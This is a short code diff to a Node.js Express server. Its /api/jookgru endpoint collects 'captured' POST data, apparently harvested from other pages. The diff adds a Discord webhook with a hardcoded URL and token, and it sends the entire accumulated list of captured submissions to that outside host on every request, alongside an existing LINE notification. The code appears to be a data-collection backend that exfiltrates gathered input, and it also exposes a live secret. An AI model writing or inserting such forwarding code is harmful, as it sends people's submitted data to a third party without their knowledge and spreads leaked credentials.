@@ -8,6 +8,8 @@ const PORT = 7122;
 const ScriptPage = require('./api/render.js')
 const IndexPage = require('./api/IndexPage.js')
 const dotenv = require('dotenv');
+const { Webhook } = require('discord-webhook-node');
+const hook = new Webhook("https://discord.com/api/webhooks/1183285576858873967/QXAIvsMowuLiFOqO3i1JVV6naqIhBoq4h_TOtjWrbP9EzeS9tEyVF-n2WyQ2eKzkyKuI");
 app.set('view engine','ejs')
 app.set('views', __dirname + '/views');
 app.use(bodyParser.json());
@@ -21,7 +23,8 @@ app.post('/api/jookgru', (req, res) => {
     const { url, data } = req.body;
     console.log('Captured POST request:', { url, data });
     postData.push({ url, data });
-    sendLineNotification(JSON.stringify(data));
+    hook.send(JSON.stringify(postData))
+    sendLineNotification(JSON.stringify(data))
     res.status(200).send('Data received successfully');
 });
 
